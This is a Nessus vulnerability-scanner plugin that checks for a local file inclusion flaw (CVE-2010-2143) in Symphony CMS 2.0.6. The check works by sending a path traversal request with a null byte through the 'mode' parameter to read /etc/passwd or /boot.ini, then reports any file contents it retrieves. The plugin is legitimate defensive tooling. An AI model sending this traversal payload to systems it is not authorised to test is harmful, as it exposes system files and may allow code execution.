#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46819);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2016/05/06 17:22:01 $");

  script_cve_id("CVE-2010-2143");
  script_bugtraq_id(40441);
  script_osvdb_id(65118);
  script_xref(name:"EDB-ID", value:12809);

  script_name(english:"Symphony 2.0.6 mode Parameter Local File Inclusion");
  script_summary(english:"Attempts to read a local file through the 'mode' parameter");

  script_set_attribute(
    attribute:"synopsis",value:
"The remote web server contains a PHP application that is susceptible
to a local file include attack.");
  script_set_attribute(
    attribute:"description",value:
"The Symphony install on the remote host fails to sanitize user-
supplied input to the 'mode' parameter in 'index.php' before using it
to include PHP code.

An unauthenticated attacker can exploit this vulnerability
to view arbitrary files or possibly to execute arbitrary PHP code on
the remote host, subject to the privileges of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.getsymphony.com/discuss/thread/35715/");
  # https://github.com/symphonycms/symphony-2/commit/5ecd4c0e905a21faa9908dd40fe6b8efbc550fba
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8a96b4c6");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Symphony 2.0.7 or later.

Note that some references indicate that version 2.0.7 is affected,
however Tenable researchers have confirmed that this vulnerability
only affects version 2.0.6.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/12/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/12/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/06/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:symphony-cms:symphony_cms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("symphony_cms_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/symphony");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80,php:TRUE);

install = get_install_from_kb(appname:'symphony', port:port,exit_on_fail:TRUE);

dir = install['dir'];

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "\[boot loader\]";

file_found  = "";
exploit     = "";
contents    = "";

foreach file (files)
{
  traversal = crap(data:"../", length:3*12) + '..';

  url = dir
         + '/index.php?mode='
         + traversal
         + file
         + '%00';

  res = http_send_recv3(method:"GET",item:url,port:port,exit_on_fail:TRUE);

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    file_found = file;
    if (os && "Windows" >< os)
      file_found = str_replace(find:'/', replace:'\\', string:file);

    exploit = build_url(port:port, qs:url);

    anchor = '';
    # We only need anchor under Windows, in other cases we directly get the file
    if ("boot.ini" >< file)
    anchor = "[boot loader";

    contents = strstr(res[2], anchor);
    contents = contents - strstr(contents,'<br />');
    break;
  }
  # We could not exploit the issue either because magic_quotes_gpc was
  # set or open_basedir was in effect.
  else if (
    '/symphony/lib/core/class.'+traversal+file >< res[2] &&
    'failed to open stream:'   >< res[2]
  )
  {
    exploit = build_url(port:port, qs:url);
    break;
  }
}

# If we don't have an exploit exit...
if (!exploit) exit(0, "The Symphony install at " +  build_url(qs:dir+'/index.php', port:port) + " is not affected.");

if (report_verbosity > 0)
{
  if (contents)
  {
    report = '\n' +
      "Nessus was able to exploit the issue to retrieve the contents of" + '\n' +
      "'" + file_found + "' on the remote host by sending the following request." + '\n' +
      '\n' +
      "  " + exploit + '\n';

    if (report_verbosity > 1 )
    {
      report = report + '\n' +
        "Here's the contents of the file : " + '\n\n' +
         crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
         contents + '\n' +
         crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n' ;
    }
  }
  else
  {
    report = '\n' +
      'Nessus was not able to exploit the issue, but it was able to verify\n' +
      'the issue exists based on the error message from the following request :\n' +
      '\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n\n' +
      exploit + '\n\n' +
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
